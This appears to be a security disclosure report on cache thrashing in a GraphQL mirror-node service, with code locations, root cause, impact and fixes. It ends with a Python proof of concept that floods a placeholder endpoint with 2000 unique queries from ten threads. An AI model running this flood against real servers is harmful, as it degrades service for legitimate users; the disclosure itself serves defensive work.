### Title
Unbounded Cache Thrashing via Unique Query Flooding on Unauthenticated GraphQL Endpoint

### Summary
The `CachedPreparsedDocumentProvider` caches parsed GraphQL documents keyed by the raw query string in a Caffeine cache with a hard cap of 1000 entries and no per-client rate limiting on the GraphQL endpoint. An unauthenticated attacker can continuously submit unique queries to saturate and continuously evict the cache, ensuring no legitimate query ever benefits from pre-parsing, forcing the server to re-parse and re-validate every single request.

### Finding Description
**Code locations:**

- `graphql/src/main/java/org/hiero/mirror/graphql/cache/CacheProperties.java` line 15: cache spec is `expireAfterWrite=1h,maximumSize=1000,recordStats` — hard cap of 1000 entries.
- `graphql/src/main/java/org/hiero/mirror/graphql/cache/CachedPreparsedDocumentProvider.java` line 26: `cache.get(executionInput.getQuery(), key -> parseAndValidateFunction.apply(executionInput))` — cache key is the **raw, unnormalized query string**.
- `graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java` lines 42–48: the `PreparsedDocumentProvider` is wired into the GraphQL engine with no surrounding rate-limiting or authentication guard.

**Root cause:** The cache key is the verbatim query string. There is no normalization (e.g., whitespace collapsing, field-order canonicalization), no per-IP or per-client throttle, and no authentication requirement on the GraphQL endpoint. The `web3` module has a `ThrottleConfiguration`/`ThrottleManagerImpl` with bucket4j rate limiting, but **no equivalent exists for the GraphQL module**.

**Exploit flow:**
1. Attacker generates queries that are structurally valid but differ by a single character (e.g., varying a comment, alias, or whitespace character): `{ account(entityId:"0.0.1"){id} }`, `{ account(entityId:"0.0.2"){id} }`, … up to and beyond 1000 variants.
2. Each unique string is a distinct cache key; after 1001 requests the LRU eviction begins.
3. Attacker sustains the flood at a rate that keeps the cache in constant churn — every entry is evicted before it can be reused.
4. All legitimate repeated queries now miss the cache and trigger full parse + validate on every request.

**Why existing checks are insufficient:**
- `maxCharacters(10000)`, `maxTokens(1000)`, `maxRuleDepth(100)`, `maxWhitespaceTokens(1000)` — these bound the *size* of a single query but do not limit the *number* of distinct queries submitted.
- `MaxQueryComplexityInstrumentation(200)` and `MaxQueryDepthInstrumentation(10)` — these reject expensive individual queries but are evaluated **after** the cache miss triggers parsing, and do not prevent cache flooding.
- JSON parsing limits (`maxDocumentLength`, `maxTokenCount`, etc.) — same: per-request guards, not per-client volume guards.

### Impact Explanation
Every cache miss forces a full GraphQL parse and validation cycle (CPU-bound, bounded by parser limits but non-trivial). With the cache permanently thrashed, the server degrades to worst-case per-request overhead for all users. Under sustained attack this increases CPU utilization and latency for every legitimate client sharing the same server instance. The `GraphQLHighCPU` Prometheus alert (threshold 80%) in the Helm chart confirms the operators consider CPU exhaustion a critical condition.

### Likelihood Explanation
The attack requires zero privileges — the GraphQL endpoint is publicly accessible with no authentication. Generating 1000+ syntactically valid, structurally distinct queries is trivial (vary a single field argument value or add a comment). The attack is fully repeatable and can be sustained indefinitely from a single client or distributed across multiple IPs. No special tooling beyond a basic HTTP client is needed.

### Recommendation
1. **Add per-client rate limiting** to the GraphQL endpoint, mirroring the bucket4j `ThrottleConfiguration` already present in the `web3` module.
2. **Normalize the cache key** before lookup: strip comments, collapse whitespace, and sort field selections so semantically equivalent queries share a cache entry and reduce the effective key space an attacker can exploit.
3. **Bound cache entry size** by rejecting or not caching queries above a configurable character threshold before they enter the cache.
4. **Consider a bounded admission policy** (e.g., only cache queries seen more than once) to prevent single-use flood entries from consuming cache capacity.

### Proof of Concept
```python
import requests, threading

ENDPOINT = "http://<graphql-host>/graphql"
HEADERS = {"Content-Type": "application/json"}

def flood(start, count):
    for i in range(start, start + count):
        # Each query is unique due to the varying account ID
        query = f'{{ account(entityId: "0.0.{i}") {{ id balance }} }}'
        requests.post(ENDPOINT, json={"query": query}, headers=HEADERS)

# Launch 10 threads each sending 200 unique queries = 2000 unique cache keys
threads = [threading.Thread(target=flood, args=(i * 200, 200)) for i in range(10)]
for t in threads: t.start()
for t in threads: t.join()

# Now send a legitimate repeated query — it will always miss the cache
# because the attacker continuously cycles through new unique queries
for _ in range(100):
    requests.post(ENDPOINT,
        json={"query": '{ account(entityId: "0.0.98") { id } }'},
        headers=HEADERS)
# Every request above triggers a full parse+validate; cache hit rate ≈ 0%
